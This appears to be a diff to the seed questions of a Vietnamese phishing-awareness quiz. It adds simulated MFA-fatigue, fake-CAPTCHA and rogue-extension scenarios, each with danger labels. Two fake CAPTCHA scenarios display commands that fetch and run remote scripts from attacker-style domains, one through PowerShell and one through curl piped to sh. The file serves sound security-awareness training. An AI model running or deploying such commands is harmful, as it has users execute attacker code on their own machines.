@@ -142,10 +142,28 @@ export const seedQuestions: QuizQuestion[] = [
     scenarioContent:
       "Dựa trên bối cảnh mô tả, hãy xác định đây là tín hiệu an toàn hay đáng ngờ.",
     scenarioHtml: `
-      <div class="mfa-sim">
-        <p><strong>Microsoft Authenticator</strong></p>
-        <p data-spot="danger" data-label="Yêu cầu đăng nhập xuất hiện bất ngờ từ vị trí không chắc chắn">Sign-in request from Bangkok, Thailand</p>
-        <p data-spot="danger" data-label="Nút Approve có thể khiến bạn vô tình chấp nhận đăng nhập của kẻ tấn công">Approve? <button type="button">Yes</button> <button type="button">No</button></p>
+      <div class="mfa-sim mfa-verify-sim">
+        <div class="mfa-phone-shell">
+          <div class="mfa-phone-status"><span>09:42</span><span>5G 84%</span></div>
+          <div class="mfa-verify-popup">
+            <div class="mfa-popup-icon">!</div>
+            <p class="mfa-app-name">Microsoft Authenticator</p>
+            <h4 data-spot="danger" data-label="Yêu cầu phê duyệt đăng nhập xuất hiện bất ngờ, người dùng không chủ động đăng nhập">Approve sign-in?</h4>
+            <div class="mfa-request-card">
+              <div data-spot="danger" data-label="Vị trí đăng nhập không rõ ràng và không khớp bối cảnh làm việc"><span>Location</span><strong>Bangkok, Thailand</strong></div>
+              <div data-spot="danger" data-label="Thiết bị đăng nhập lạ là dấu hiệu cần từ chối yêu cầu MFA"><span>Device</span><strong>Unknown Windows device</strong></div>
+              <div data-spot="danger" data-label="Nhiều yêu cầu liên tiếp là dấu hiệu MFA fatigue"><span>Requests</span><strong>5 prompts in 2 minutes</strong></div>
+            </div>
+            <div class="mfa-number-match" data-spot="danger" data-label="Nếu không chủ động đăng nhập, không được nhập mã hoặc bấm Approve dù popup trông hợp lệ">
+              <span>Enter number shown on sign-in screen</span>
+              <strong>42</strong>
+            </div>
+            <div class="mfa-actions">
+              <button type="button" class="mfa-deny">Deny</button>
+              <button type="button" class="mfa-approve" data-spot="danger" data-label="Bấm Approve có thể cấp quyền truy cập cho kẻ tấn công">Approve</button>
+            </div>
+          </div>
+        </div>
       </div>
     `,
     correctAnswer: "phishing",
@@ -744,18 +762,25 @@ export const seedQuestions: QuizQuestion[] = [
     scenarioContent:
       "Hãy kiểm tra cách website yêu cầu xác minh và quyết định đây là phishing hay legitimate.",
     scenarioHtml: `
-      <div class="portal-sim">
-        <div class="mail-row" data-spot="danger" data-label="Domain xác minh không thuộc hệ thống VPS"><strong>URL:</strong> <a href="https://vps-captcha-verify.com/check" title="https://vps-captcha-verify.com/check">https://vps-captcha-verify.com/check</a></div>
-        <div class="captcha-verify">
-          <h4>Security verification required</h4>
-          <p data-spot="danger" data-label="Captcha hợp lệ không yêu cầu người dùng mở Run/Terminal hoặc dán lệnh hệ thống">To prove you are human, complete the verification on your computer.</p>
-          <ul class="captcha-steps">
-            <li data-spot="danger" data-label="Yêu cầu bấm Windows + R là hành vi rất bất thường với Captcha">Press <strong>Windows + R</strong></li>
-            <li data-spot="danger" data-label="Yêu cầu Ctrl + V để dán lệnh là dấu hiệu phát tán mã độc">Press <strong>Ctrl + V</strong> to paste the verification code</li>
-            <li>Press Enter to finish verification</li>
-          </ul>
-          <code class="captcha-command" data-spot="danger" data-label="Lệnh PowerShell tải và chạy mã từ Internet có nguy cơ cài mã độc">powershell -w hidden -c "iwr https://vps-captcha-verify.com/update.ps1 | iex"</code>
-          <button type="button" data-spot="danger" data-label="Nút copy lệnh hệ thống không phải hành vi Captcha bình thường">Copy verification command</button>
+      <div class="portal-sim website-browser-template">
+        <div class="browser-window">
+          <div class="browser-topbar">
+            <div class="browser-controls"><i></i></div>
+            <div class="browser-address" data-spot="danger" data-label="Domain xác minh không thuộc hệ thống VPS"><span>https://vps-captcha-verify.com/check</span></div>
+          </div>
+          <div class="browser-page captcha-browser-page">
+            <div class="captcha-verify">
+              <h4>Security verification required</h4>
+              <p data-spot="danger" data-label="Captcha hợp lệ không yêu cầu người dùng mở Run/Terminal hoặc dán lệnh hệ thống">To prove you are human, complete the verification on your computer.</p>
+              <ul class="captcha-steps">
+                <li data-spot="danger" data-label="Yêu cầu bấm Windows + R là hành vi rất bất thường với Captcha">Press <strong>Windows + R</strong></li>
+                <li data-spot="danger" data-label="Yêu cầu Ctrl + V để dán lệnh là dấu hiệu phát tán mã độc">Press <strong>Ctrl + V</strong> to paste the verification code</li>
+                <li>Press Enter to finish verification</li>
+              </ul>
+              <code class="captcha-command" data-spot="danger" data-label="Lệnh PowerShell tải và chạy mã từ Internet có nguy cơ cài mã độc">powershell -w hidden -c "iwr https://vps-captcha-verify.com/update.ps1 | iex"</code>
+              <button type="button" data-spot="danger" data-label="Nút copy lệnh hệ thống không phải hành vi Captcha bình thường">Copy verification command</button>
+            </div>
+          </div>
         </div>
       </div>
     `,
@@ -766,6 +791,120 @@ export const seedQuestions: QuizQuestion[] = [
     active: true,
     alwaysIncluded: false,
     orderIndex: 31,
+  },
+  {
+    id: "q32",
+    title: "Captcha đăng nhập VPS hợp lệ",
+    category: "Website",
+    scenarioIntro: "Bạn đang mở trang đăng nhập chính thức của VPS và gặp bước xác minh Captcha.",
+    scenarioContent:
+      "Hãy quan sát domain, cách xác minh và quyết định tình huống này là phishing hay legitimate.",
+    scenarioHtml: `
+      <div class="portal-sim website-browser-template">
+        <div class="browser-window">
+          <div class="browser-topbar">
+            <div class="browser-controls"><i></i></div>
+            <div class="browser-address" data-spot="safe" data-label="Domain thuộc hệ thống chính thức vps.com.vn"><span>https://www.vps.com.vn/dang-nhap</span></div>
+          </div>
+          <div class="browser-page captcha-browser-page">
+            <div class="captcha-verify captcha-safe">
+              <h4>Xác minh bảo mật</h4>
+              <p data-spot="safe" data-label="Captcha hợp lệ chỉ yêu cầu thao tác trực tiếp trên trình duyệt, không yêu cầu chạy lệnh hệ thống">Vui lòng hoàn tất Captcha để tiếp tục đăng nhập.</p>
+              <div class="captcha-checkbox" data-spot="safe" data-label="Checkbox Captcha là thao tác phổ biến và không yêu cầu tải file hay nhập mật khẩu lại">
+                <span></span>
+                <strong>Tôi không phải là robot</strong>
+              </div>
+              <p class="captcha-policy">Privacy - Terms</p>
+              <button type="button">Tiếp tục</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    `,
+    correctAnswer: "legitimate",
+    explanation:
+      "Captcha hiển thị trên domain chính thức vps.com.vn và chỉ yêu cầu thao tác xác minh trên trình duyệt, không yêu cầu chạy lệnh, tải file hay nhập OTP.",
+    indicators: ["Domain chính thức", "Captcha thao tác trên trình duyệt", "Không yêu cầu chạy lệnh"],
+    active: true,
+    alwaysIncluded: false,
+    orderIndex: 32,
+  },
+  {
+    id: "q33",
+    title: "Captcha yêu cầu chạy lệnh Terminal trên macOS",
+    category: "Website",
+    scenarioIntro: "Một website hiển thị Captcha nhưng yêu cầu bạn mở Terminal để hoàn tất xác minh.",
+    scenarioContent:
+      "Hãy kiểm tra cách website yêu cầu xác minh và quyết định đây là phishing hay legitimate.",
+    scenarioHtml: `
+      <div class="portal-sim website-browser-template">
+        <div class="browser-window">
+          <div class="browser-topbar">
+            <div class="browser-controls"><i></i></div>
+            <div class="browser-address" data-spot="danger" data-label="Domain dùng tên gần giống VPS nhưng không phải vps.com.vn"><span>https://vps-secure-captcha.com/verify</span></div>
+          </div>
+          <div class="browser-page captcha-browser-page">
+            <div class="captcha-verify">
+              <h4>Human verification for macOS</h4>
+              <p data-spot="danger" data-label="Captcha thật không yêu cầu mở Terminal hoặc thực thi shell script">Open Terminal and paste the command below to continue.</p>
+              <ul class="captcha-steps">
+                <li data-spot="danger" data-label="Hướng dẫn mở Terminal là hành vi bất thường với Captcha">Open <strong>Terminal</strong></li>
+                <li data-spot="danger" data-label="Yêu cầu dán lệnh làm tăng nguy cơ người dùng tự chạy mã độc">Paste copied verification command</li>
+                <li>Press Return</li>
+              </ul>
+              <code class="captcha-command" data-spot="danger" data-label="Lệnh curl tải script từ domain giả mạo rồi chạy trực tiếp bằng shell">curl -fsSL https://vps-secure-captcha.com/check.sh | sh</code>
+              <button type="button" data-spot="danger" data-label="Nút copy lệnh là dấu hiệu rất nguy hiểm, không phải Captcha hợp lệ">Copy for verification</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    `,
+    correctAnswer: "phishing",
+    explanation:
+      "Website giả mạo yêu cầu mở Terminal và chạy lệnh tải script từ Internet. Captcha hợp lệ không bao giờ yêu cầu người dùng thực thi lệnh hệ điều hành.",
+    indicators: ["Domain gần giống VPS", "Yêu cầu mở Terminal", "Lệnh tải script từ Internet"],
+    active: true,
+    alwaysIncluded: false,
+    orderIndex: 33,
+  },
+  {
+    id: "q34",
+    title: "Captcha yêu cầu cài tiện ích trình duyệt",
+    category: "Website",
+    scenarioIntro: "Bạn truy cập một trang báo cần cài tiện ích để vượt qua Captcha.",
+    scenarioContent:
+      "Hãy đánh giá yêu cầu trên website và quyết định đây là phishing hay legitimate.",
+    scenarioHtml: `
+      <div class="portal-sim website-browser-template">
+        <div class="browser-window">
+          <div class="browser-topbar">
+            <div class="browser-controls"><i></i></div>
+            <div class="browser-address" data-spot="danger" data-label="Domain không phải hệ thống VPS và đang mạo danh kiểm tra bảo mật"><span>https://vps-browser-check.net/security</span></div>
+          </div>
+          <div class="browser-page captcha-browser-page">
+            <div class="captcha-verify">
+              <h4>Captcha blocked</h4>
+              <p data-spot="danger" data-label="Captcha thật không yêu cầu cài extension để xác minh người dùng">Install the Secure Browser Verification extension to continue.</p>
+              <div class="captcha-extension-card" data-spot="danger" data-label="Extension lạ có thể đánh cắp cookie, phiên đăng nhập hoặc dữ liệu trình duyệt">
+                <span class="extension-icon">EXT</span>
+                <div>
+                  <strong>Secure Browser Verification</strong>
+                  <p>Can read and change all your data on all websites</p>
+                </div>
+              </div>
+              <button type="button" data-spot="danger" data-label="Nút cài tiện ích từ nguồn không rõ ràng là dấu hiệu nguy hiểm">Install extension</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    `,
+    correctAnswer: "phishing",
+    explanation:
+      "Captcha hợp lệ không yêu cầu cài tiện ích trình duyệt, đặc biệt là tiện ích có quyền đọc và thay đổi dữ liệu trên mọi website.",
+    indicators: ["Yêu cầu cài extension", "Quyền truy cập dữ liệu rộng", "Domain không thuộc VPS"],
+    active: true,
+    alwaysIncluded: false,
+    orderIndex: 34,
   },
 ];
 
